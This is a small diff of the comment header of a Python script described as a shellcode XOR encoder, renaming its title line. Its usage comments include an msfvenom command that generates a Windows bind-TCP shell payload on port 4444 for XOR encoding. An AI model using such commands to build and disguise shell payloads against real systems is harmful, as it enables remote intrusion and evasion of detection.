@@ -1,4 +1,4 @@
-# Simple Shellcode XOR encoder
+# Simple XOR Shellcode encoder
 # Author:  w4fz5uck5
 # msfvenom -p windows/shell/bind_tcp lport=4444 -f raw > shell.bin
 # python xor_enc.py shell.bin                                                                                                                                                                                [±master ●]
